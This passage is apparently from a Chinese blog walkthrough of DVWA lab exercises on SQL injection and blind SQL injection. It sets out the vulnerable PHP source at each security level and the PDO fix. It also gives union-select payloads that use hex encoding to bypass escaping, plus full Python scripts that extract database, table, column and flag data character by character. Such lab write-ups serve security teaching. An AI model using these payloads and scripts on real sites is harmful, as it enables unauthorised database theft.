mysqli_real_escape_string($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $id);</span><br><span class="line"></span><br><span class="line">    $query  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = $id;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>], $query) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    <span class="keyword">while</span>( $row = mysqli_fetch_assoc( $result ) ) &#123;</span><br><span class="line">        <span class="comment">// Display values</span></span><br><span class="line">        $first = $row[<span class="string">&quot;first_name&quot;</span>];</span><br><span class="line">        $last  = $row[<span class="string">&quot;last_name&quot;</span>];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This is used later on in the index.php page</span></span><br><span class="line"><span class="comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span></span><br><span class="line">$query  = <span class="string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;</span><br><span class="line">$result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $query ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line">$number_of_rows = mysqli_fetch_row( $result )[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Medium级别的代码利用<code>mysql_real_escape_string</code>函数对特殊符号<code>\x00,\n,\r,\,&#39;,&quot;,\x1a</code>进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。</p><p>我们可以通过burpsuite接收并控制id</p><p>由于单引号被转义，所以之前的payload会出错，尽量避免使用<code>&#39;</code>，也可以通过hex，16进制的形式，将必须的字符串做转换，从而绕过<code>mysql_real_escape_string</code>函数。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1 order by 2# </span><br><span class="line">1 union select 1,2#</span><br><span class="line">1 union select 1,database()#</span><br><span class="line">查表</span><br><span class="line">1 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">f14g15here,guestbook,users</span><br><span class="line"></span><br><span class="line">查列（用16进制绕过指定表名所需的&#39;）</span><br><span class="line">1 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;0×7573657273 #</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line">1 union select 1,password from users where user&#x3D;0x61646d696e</span><br><span class="line">d78b6f30225cdc811adfe8d4e7c9fd34</span><br></pre></td></tr></table></figure><h2 id="High-5"><a href="#High-5" class="headerlink" title="High"></a>High</h2><p>与Medium相比，多了<code>LIMIT 1</code> 想通过这种方式限制输出。然后用SESSION_ID 的方式，但实际上与Low级别的防护一样差。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$query  &#x3D; &quot;SELECT first_name, last_name FROM users WHERE user_id &#x3D; &#39;$id&#39; LIMIT 1;&quot;;</span><br></pre></td></tr></table></figure><p>至于payload，Low级别的都可以用。。。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;  union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database() #</span><br><span class="line">Surname: f14g15here,guestbook,users</span><br><span class="line"></span><br><span class="line">1&#39; and 1&#x3D;2 union select 1,group_concat(column_name) from information_schema.COLUMNS where table_schema&#x3D;&#39;dvwa&#39; and table_name&#x3D;&#39;users&#39;#</span><br><span class="line">user_id,first_name,last_name,user,password,avatar,last_login,failed_login</span><br></pre></td></tr></table></figure><h2 id="Impossible-5"><a href="#Impossible-5" class="headerlink" title="Impossible"></a>Impossible</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( $_REQUEST[ <span class="string">&#x27;user_token&#x27;</span> ], $_SESSION[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Was a number entered?</span></span><br><span class="line">    <span class="keyword">if</span>(is_numeric( $id )) &#123;</span><br><span class="line">        <span class="comment">// Check the database</span></span><br><span class="line">        $data = $db-&gt;prepare( <span class="string">&#x27;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&#x27;</span> );</span><br><span class="line">        $data-&gt;bindParam( <span class="string">&#x27;:id&#x27;</span>, $id, PDO::PARAM_INT );</span><br><span class="line">        $data-&gt;execute();</span><br><span class="line">        $row = $data-&gt;fetch();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Make sure only 1 result is returned</span></span><br><span class="line">        <span class="keyword">if</span>( $data-&gt;rowCount() == <span class="number">1</span> ) &#123;</span><br><span class="line">            <span class="comment">// Get values</span></span><br><span class="line">            $first = $row[ <span class="string">&#x27;first_name&#x27;</span> ];</span><br><span class="line">            $last  = $row[ <span class="string">&#x27;last_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for end user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，Impossible级别的代码采用了PDO技术，划清了代码与数据的界限，有效防御SQL注入，同时只有返回的查询结果数量为一时，才会成功输出，这样就有效预防了“脱裤”，Anti-CSRFtoken机制的加入了进一步提高了安全性。</p><h1 id="SQL-Blind-Injection（SQL盲注）"><a href="#SQL-Blind-Injection（SQL盲注）" class="headerlink" title="SQL Blind Injection（SQL盲注）"></a>SQL Blind Injection（SQL盲注）</h1><h2 id="Low-7"><a href="#Low-7" class="headerlink" title="Low"></a>Low</h2><p>盲注，没有数据的回显，只显示<code>userid</code>在数据库或者不在数据库中。没有任何过滤。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_GET[ <span class="string">&#x27;Submit&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_GET[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27;;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>payload</strong></p><p>因为存在明显的两种条件表示是非，可以通过布尔盲注来注入得到数据。为了更贴近CTF，我增加了一条flag的表，作为测试。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line">import requests</span><br><span class="line">import <span class="keyword">string</span></span><br><span class="line"></span><br><span class="line">dic = <span class="keyword">string</span>.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://192.168.220.1/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;low&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line">def dbnameLength():</span><br><span class="line">    <span class="keyword">for</span> DBlen in range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = <span class="string">&quot;?id=1&#x27; and length(database())=&#123;&#125;%23&amp;Submit=Submit&quot;</span>.format(DBlen)</span><br><span class="line">        DBlen_url = url + PayloadofDBlen</span><br><span class="line">        response = s.get(DBlen_url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> TrueState in response:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line">def dbname():</span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            DBnamePayload = <span class="string">&quot;?id=1&#x27; and substr(database(),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit&quot;</span>.format(i,str(c))</span><br><span class="line">            DBname_url = url + DBnamePayload</span><br><span class="line">            <span class="keyword">print</span>(DBnamePayload)</span><br><span class="line">            response = s.get(DBname_url,cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                DBname += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line">def tableName():</span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            tableName_payload = <span class="string">&quot;?id=1&#x27; and substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit#&quot;</span>.format(str(i),str(c))</span><br><span class="line">            tableName_url = url + tableName_payload</span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.get(tableName_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                table_name += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line">def ColumnName(tablename):</span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            columnName_payload = <span class="string">&quot;?id=1&#x27; and substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;&#123;&#125;&#x27;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27; %23&amp;Submit=Submit#&quot;</span>.format(tablename,str(i),str(c))</span><br><span class="line">            columnName_url = url + columnName_payload</span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.get(columnName_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                column_name += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.爆出指定表指定列的数据</span></span><br><span class="line">def flag(columname, tablename):</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i in range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c in dic:</span><br><span class="line">            payload = <span class="string">&quot;?id=1&#x27; and substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1)=&#x27;&#123;&#125;&#x27;%23&amp;Submit=Submit#&quot;</span>.format(columname,tablename,i,str(c))</span><br><span class="line">            flag_url = url + payload</span><br><span class="line">            response = s.get(flag_url, cookies=cookies).text</span><br><span class="line">            <span class="keyword">if</span> TrueState in response:</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableNum()</span></span><br><span class="line">    tableName()</span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE f14g15here:f1ag</span></span><br><span class="line">    <span class="comment"># flag(&#x27;f1ag&#x27;,&#x27;f14g15here&#x27;)</span></span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="Medium-7"><a href="#Medium-7" class="headerlink" title="Medium"></a>Medium</h2><p>主要将<code>id</code>换成数字型注入，然后通过POST方法上传数据，通过下拉表单的方式试图避免id可控，但是通过写脚本和burp，id是可控的。还通过<code>mysqli_real_escape_string</code>转义单引号<code>’</code>。</p><p>可以通过16进制绕过必要的字符或者ascii码来判断</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;100 %23</span><br><span class="line">id&#x3D;1 and ascii(substr(database(),1,1))&#x3D;0x64 %23</span><br></pre></td></tr></table></figure><p>直接放一下脚本：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;medium&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;51ca1k3krm3iqvo0tsfhjiu8lu&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbnameLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> DBlen <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 and length(database())=&#123;&#125;%23&quot;</span>.format(DBlen), <span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">        response = s.post(url,cookies=cookies,data=PayloadofDBlen).text</span><br><span class="line">        <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">            print(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbname</span>():</span></span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, DBlen+<span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            DBnamePayload = &#123;<span class="string">&#x27;id&#x27;</span>: <span class="string">&quot;1 and ascii(substr(database(),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(i,ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># DBname_url = url + DBnamePayload</span></span><br><span class="line">            <span class="comment"># print(DBnamePayload)</span></span><br><span class="line">            response = s.post(url,cookies=cookies,data=DBnamePayload).text</span><br><span class="line">            <span class="comment"># print(response)</span></span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                DBname += c</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    print(<span class="string">&quot;DBname is:&quot;</span>, DBname)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出所有的表名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tableName</span>():</span></span><br><span class="line">    table_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            tableName_payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(str(i),ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># tableName_url = url + tableName_payload</span></span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=tableName_payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                table_name += c</span><br><span class="line">                print(<span class="string">&#x27;table_name:&#x27;</span>,table_name)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.爆出指定表的所有列名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ColumnName</span>(<span class="params">tablename</span>):</span></span><br><span class="line">    column_name = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            columnName_payload = &#123;<span class="string">&quot;id&quot;</span>:<span class="string">&quot;1 and ascii(substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#123;&#125;),&#123;&#125;,1))=&#123;&#125; #&quot;</span>.format(tablename,str(i),ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># columnName_url = url + columnName_payload</span></span><br><span class="line">            <span class="comment"># print(tableName_url)</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=columnName_payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                column_name += c</span><br><span class="line">                print(<span class="string">&quot;column_name of TABLE &#123;&#125;:&#123;&#125;&quot;</span>.format(tablename,column_name))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>(<span class="params">columname, tablename</span>):</span></span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">51</span>):</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> dic:</span><br><span class="line">            payload = &#123;<span class="string">&#x27;id&#x27;</span>:<span class="string">&quot;1 and ascii(substr((select &#123;&#125; from &#123;&#125;),&#123;&#125;,1))=&#123;&#125;#&quot;</span>.format(columname,tablename,i,ord(c)),<span class="string">&#x27;Submit&#x27;</span>:<span class="string">&#x27;Submit&#x27;</span>&#125;</span><br><span class="line">            <span class="comment"># flag_url = url + payload</span></span><br><span class="line">            response = s.post(url, cookies=cookies, data=payload).text</span><br><span class="line">            <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">                flag += c</span><br><span class="line">                print(<span class="string">&quot;flag is&quot;</span>,flag)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># dbnameLength()</span></span><br><span class="line">    <span class="comment"># dbname()</span></span><br><span class="line">    <span class="comment"># tableName()</span></span><br><span class="line">    <span class="comment"># table_name: f14g15here,guestbook,users</span></span><br><span class="line">    <span class="comment"># ColumnName(&#x27;0x66313467313568657265&#x27;)</span></span><br><span class="line">    <span class="comment"># column_name of TABLE 0x66313467313568657265:f1Ag</span></span><br><span class="line">    flag(<span class="string">&#x27;f1Ag&#x27;</span>,<span class="string">&#x27;f14g15here&#x27;</span>)</span><br><span class="line">    <span class="comment"># flag is flag&#123;this_is_a_test_flag&#125;</span></span><br></pre></td></tr></table></figure><h2 id="High-6"><a href="#High-6" class="headerlink" title="High"></a>High</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    $id = $_COOKIE[ <span class="string">&#x27;id&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check database</span></span><br><span class="line">    $getid  = <span class="string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;$id&#x27; LIMIT 1;&quot;</span>;</span><br><span class="line">    $result = mysqli_query($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>],  $getid ); <span class="comment">// Removed &#x27;or die&#x27; to suppress mysql errors</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get results</span></span><br><span class="line">    $num = @mysqli_num_rows( $result ); <span class="comment">// The &#x27;@&#x27; character suppresses errors</span></span><br><span class="line">    <span class="keyword">if</span>( $num &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID exists in the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Might sleep a random amount</span></span><br><span class="line">        <span class="keyword">if</span>( rand( <span class="number">0</span>, <span class="number">5</span> ) == <span class="number">3</span> ) &#123;</span><br><span class="line">            sleep( rand( <span class="number">2</span>, <span class="number">4</span> ) );</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// User wasn&#x27;t found, so the page wasn&#x27;t!</span></span><br><span class="line">        header( $_SERVER[ <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span> ] . <span class="string">&#x27; 404 Not Found&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;User ID is MISSING from the database.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null($___mysqli_res = mysqli_close($GLOBALS[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : $___mysqli_res);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数<code>sleep(seconds)</code>，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p><p>另外，注入点变成了<code>Cookie[&#39;id&#39;]</code>,至于payload，用Low级别的就可以。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">dic = string.printable[:<span class="number">94</span>]</span><br><span class="line"><span class="comment"># print(dic)</span></span><br><span class="line"><span class="comment"># 注入点url</span></span><br><span class="line">url = <span class="string">&quot;http://localhost/dvwa/vulnerabilities/sqli_blind/&quot;</span></span><br><span class="line">TrueState = <span class="string">&#x27;exists&#x27;</span></span><br><span class="line">FlaseState = <span class="string">&#x27;MISSING&#x27;</span></span><br><span class="line">cookies = &#123;<span class="string">&#x27;security&#x27;</span>:<span class="string">&#x27;high&#x27;</span>,<span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;igtb1sfu1lm1gb9e4ug06i0d1e&#x27;</span>&#125;</span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.爆库名的长度</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbnameLength</span>():</span></span><br><span class="line">    <span class="keyword">for</span> DBlen <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        PayloadofDBlen = <span class="string">&quot;1&#x27; and length(database())=&#123;&#125;%23&amp;Submit=Submit&quot;</span>.format(DBlen)</span><br><span class="line">        cookies[<span class="string">&#x27;id&#x27;</span>]=PayloadofDBlen</span><br><span class="line">        <span class="comment"># print(cookies)</span></span><br><span class="line">        response = s.get(url,cookies=cookies).text</span><br><span class="line">        <span class="keyword">if</span> TrueState <span class="keyword">in</span> response:</span><br><span class="line">            print(<span class="string">&quot;DBnamelen is &quot;</span>, DBlen)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.爆库名</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbname</span>():</span></span><br><span class="line">    DBlen = <span class="number">4</span></span><br><span class="line">    DBname = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, 